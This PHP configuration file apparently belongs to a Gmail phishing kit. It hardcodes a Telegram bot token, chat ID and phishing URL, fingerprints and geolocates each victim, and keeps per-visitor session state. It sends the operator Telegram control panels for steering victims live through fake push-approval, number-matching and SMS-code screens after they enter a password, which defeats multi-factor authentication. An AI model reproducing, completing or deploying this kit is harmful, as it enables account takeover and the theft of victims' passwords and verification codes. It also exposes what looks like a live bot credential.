<?php

// Compatibility patch for servers misreporting their PHP version
if (!function_exists('str_contains')) {
    function str_contains(string $haystack, string $needle): bool {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
}

// config.php — Core configuration & shared utilities

define('TG_TOKEN',     '7400161183:AAGfcT7HP7wiNmRUnypa-dc8mDAZyLUhjGc');
define('TG_CHAT_ID',   '1212136600');
define('APP_URL',      'https://yi.hubyvc.com/1vite/gmail');
define('SESSIONS_DIR',  __DIR__ . '/sessions_data');

if (!is_dir(SESSIONS_DIR)) mkdir(SESSIONS_DIR, 0777, true);

/* ══════════════════════════════════════════
   DEVICE DETECTION
══════════════════════════════════════════ */
function detect_device(string $ua): array {
    $ua_lower = strtolower($ua);
    $os = 'Unknown OS';
    if (str_contains($ua_lower, 'iphone'))             $os = '🍎 iPhone (iOS)';
    elseif (str_contains($ua_lower, 'ipad'))           $os = '🍎 iPad (iOS)';
    elseif (str_contains($ua_lower, 'android'))        $os = '🤖 Android';
    elseif (str_contains($ua_lower, 'windows nt 10'))  $os = '🪟 Windows 10/11';
    elseif (str_contains($ua_lower, 'windows nt 6.3')) $os = '🪟 Windows 8.1';
    elseif (str_contains($ua_lower, 'windows nt 6.1')) $os = '🪟 Windows 7';
    elseif (str_contains($ua_lower, 'windows'))        $os = '🪟 Windows';
    elseif (str_contains($ua_lower, 'mac os x'))       $os = '🍏 macOS';
    elseif (str_contains($ua_lower, 'linux'))          $os = '🐧 Linux';
    elseif (str_contains($ua_lower, 'chromeos'))       $os = '💻 ChromeOS';

    $type = 'Desktop 🖥️';
    if (str_contains($ua_lower, 'mobile'))             $type = 'Mobile 📱';
    elseif (str_contains($ua_lower, 'tablet') || str_contains($ua_lower, 'ipad')) $type = 'Tablet 📟';

    $browser = 'Unknown Browser';
    if (str_contains($ua_lower, 'edg/') || str_contains($ua_lower, 'edge/'))      $browser = '🔵 Microsoft Edge';
    elseif (str_contains($ua_lower, 'opr/') || str_contains($ua_lower, 'opera'))  $browser = '🔴 Opera';
    elseif (str_contains($ua_lower, 'brave'))        $browser = '🦁 Brave';
    elseif (str_contains($ua_lower, 'chrome') && !str_contains($ua_lower, 'chromium')) $browser = '🌐 Google Chrome';
    elseif (str_contains($ua_lower, 'chromium'))     $browser = '🌐 Chromium';
    elseif (str_contains($ua_lower, 'firefox'))      $browser = '🦊 Firefox';
    elseif (str_contains($ua_lower, 'safari') && !str_contains($ua_lower, 'chrome')) $browser = '🧭 Safari';
    elseif (str_contains($ua_lower, 'msie') || str_contains($ua_lower, 'trident')) $browser = '💀 Internet Explorer';
    elseif (str_contains($ua_lower, 'samsung'))      $browser = '📱 Samsung Browser';
    elseif (str_contains($ua_lower, 'ucbrowser'))    $browser = '🟡 UC Browser';

    $version = '';
    if (preg_match('/(chrome|firefox|safari|edg|opr|version)\/([0-9.]+)/i', $ua, $m)) {
        $version = 'v' . explode('.', $m[2])[0];
    }

    return [
        'os'      => $os,
        'browser' => $browser . ($version ? " $version" : ''),
        'type'    => $type,
        'ua_full' => $ua,
    ];
}

/* ══════════════════════════════════════════
   GEO-IP LOCATION (City, State, Country)
   3-tier fallback — never returns N/A
══════════════════════════════════════════ */
function get_visitor_location(string $ip = ''): string {
    if (!$ip) $ip = $_SERVER['REMOTE_ADDR'] ?? '';

    // Handle X-Forwarded-For (proxies/CDN)
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    $ip = preg_replace('/:\d+$/', '', trim($ip));

    // Skip localhost
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0) {
        return 'Localhost / Private Network';
    }

    // ── Tier 1: ip-api.com ──
    $d = _geo_fetch('http://ip-api.com/json/' . urlencode($ip) . '?fields=status,city,regionName,country');
    if ($d && isset($d['status']) && $d['status'] === 'success') {
        return _geo_format($d['city'] ?? '', $d['regionName'] ?? '', $d['country'] ?? '');
    }

    // ── Tier 2: ipwho.is ──
    $d2 = _geo_fetch('https://ipwho.is/' . urlencode($ip));
    if ($d2 && !empty($d2['success'])) {
        return _geo_format($d2['city'] ?? '', $d2['region'] ?? '', $d2['country'] ?? '');
    }

    // ── Tier 3: geoplugin.net ──
    $d3 = _geo_fetch('http://www.geoplugin.net/json.gp?ip=' . urlencode($ip));
    if ($d3) {
        return _geo_format(
            $d3['geoplugin_city'] ?? '',
            $d3['geoplugin_region'] ?? '',
            $d3['geoplugin_countryName'] ?? ''
        );
    }

    // ── Last resort: return raw IP ──
    return $ip ?: 'Unknown Location';
}

function _geo_fetch(string $url): ?array {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 4,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT      => 'Mozilla/5.0',
        CURLOPT_HTTPHEADER     => ['Accept: application/json'],
    ]);
    $res = curl_exec($ch);
    $err = curl_errno($ch);
    curl_close($ch);
    if ($err || !$res) return null;
    $data = json_decode($res, true);
    return is_array($data) ? $data : null;
}

function _geo_format(string $city, string $state, string $country): string {
    $parts = [];
    if ($city    && $city    !== '-') $parts[] = trim($city);
    if ($state   && $state   !== '-' && $state !== $city) $parts[] = trim($state);
    if ($country && $country !== '-') $parts[] = trim($country);
    return $parts ? implode(', ', $parts) : 'Unknown Location';
}

/* ══════════════════════════════════════════
   VISITOR STATE
══════════════════════════════════════════ */
function state_file(string $sid): string {
    return SESSIONS_DIR . '/v_' . preg_replace('/[^a-zA-Z0-9]/', '', $sid) . '.json';
}

function get_state(string $sid): array {
    $f = state_file($sid);
    if (!file_exists($f)) return [
        'page'          => 'email',
        'prompt_number' => 89,
        'blocked'       => false,
        'sid'           => $sid,
        'ip'            => $_SERVER['REMOTE_ADDR'] ?? '?',
        'created'       => date('H:i:s d/m/Y'),
    ];
    return json_decode(file_get_contents($f), true) ?? [];
}

function set_state(string $sid, array $data): void {
    $cur = get_state($sid);
    file_put_contents(state_file($sid), json_encode(array_merge($cur, $data)));
}

function delete_visitor(string $sid): void {
    $f = state_file($sid);
    if (file_exists($f)) unlink($f);
}

/* ══════════════════════════════════════════
   TELEGRAM API
══════════════════════════════════════════ */
function tg_send(string $text, array $rows = []): void {
    $keyboard = [];
    foreach ($rows as $row) {
        $kb_row = [];
        foreach ($row as $btn) {
            $b = ['text' => $btn['text']];
            if (!empty($btn['url']))           $b['url']           = $btn['url'];
            if (!empty($btn['callback_data'])) $b['callback_data'] = substr($btn['callback_data'], 0, 64);
            $kb_row[] = $b;
        }
        if ($kb_row) $keyboard[] = $kb_row;
    }
    $payload = [
        'chat_id'    => TG_CHAT_ID,
        'text'       => $text,
        'parse_mode' => 'HTML',
    ];
    if ($keyboard) $payload['reply_markup'] = json_encode(['inline_keyboard' => $keyboard]);
    _tg_post('sendMessage', $payload);
}

function tg_answer(string $cq_id, string $toast = ''): void {
    _tg_post('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => $toast]);
}

function _tg_post(string $method, array $data): array {
    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/' . $method);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res ?? '{}', true) ?? [];
}

/* ══════════════════════════════════════════
   KEYBOARD BUILDERS
══════════════════════════════════════════ */

/** Main control panel — sent after password submit */
function tg_panel(string $sid): void {
    $s = get_state($sid);
    tg_send(
        "🎛 <b>CONTROL PANEL</b>\n" .
        "🆔 Visitor ID: <code>{$sid}</code>\n\n" .
        "📌 <b>Choose what to show this visitor:</b>",
        [
            [
                ['text' => '✅ YES Prompt',       'callback_data' => "yp|{$sid}"],
                ['text' => '🔔 Number Prompt',    'callback_data' => "np|{$sid}"],
            ],
            [
                ['text' => '📱 SMS Verification', 'callback_data' => "sms|{$sid}"],
                ['text' => '❌ Password Error',   'callback_data' => "pwe|{$sid}"],
            ],
            [
                ['text' => '💛 Success',           'callback_data' => "ok|{$sid}"],
                ['text' => '🛑 Block Visitor',     'callback_data' => "blk|{$sid}"],
            ],
        ]
    );
}

/** Number grid 1–100 picker (8 per row = 13 rows) */
function tg_number_grid(string $sid): void {
    $rows = [];
    foreach (array_chunk(range(1, 100), 8) as $chunk) {
        $row = [];
        foreach ($chunk as $n) {
            $row[] = ['text' => "$n", 'callback_data' => "pn|{$sid}|{$n}"];
        }
        $rows[] = $row;
    }
    $rows[] = [['text' => '« Back to Panel', 'callback_data' => "panel|{$sid}"]];
    tg_send("🔢 <b>Pick prompt number (1–100)</b>\n🆔 Visitor: <code>{$sid}</code>\n\nTap a number to show on their screen:", $rows);
}

/** After SMS submit */
function tg_after_sms(string $sid): void {
    tg_send(
        "📱 <b>SMS Code Submitted</b>\n🆔 Visitor: <code>{$sid}</code>\n\n<b>What next?</b>",
        [
            [['text' => '✅ Correct →',      'callback_data' => "ok|{$sid}"],
             ['text' => '❌ Wrong Code',      'callback_data' => "smse|{$sid}"]],
            [['text' => '⏳ Keep Loading',    'callback_data' => "ld|{$sid}"],
             ['text' => '🛑 Block',           'callback_data' => "blk|{$sid}"]],
        ]
    );
}

/**
 * After YES/Number prompt is shown.
 * $type = 'yes' or 'number'
 * $num  = the number shown on screen (only relevant when $type = 'number')
 */
function tg_after_prompt(string $sid, string $type = 'yes', int $num = 0): void {
    if ($type === 'number') {
        $label = "🔔 Number Prompt (<b>{$num}</b>) — Waiting for visitor";
    } else {
        $label = "✅ YES Prompt — Waiting for visitor";
    }
    tg_send(
        "{$label}\n" .
        "🆔 <code>{$sid}</code>\n\n" .
        "<b>What did they do on their phone?</b>",
        [
            [['text' => '✅ Approved →',     'callback_data' => "ok|{$sid}"],
             ['text' => '❌ Denied →',        'callback_data' => "pme|{$sid}"]],
            [['text' => '📱 Switch to SMS',   'callback_data' => "sms|{$sid}"],
             ['text' => '🔢 Change Number',   'callback_data' => "np|{$sid}"]],
            [['text' => '🛑 Block Visitor',   'callback_data' => "blk|{$sid}"]],
        ]
    );
}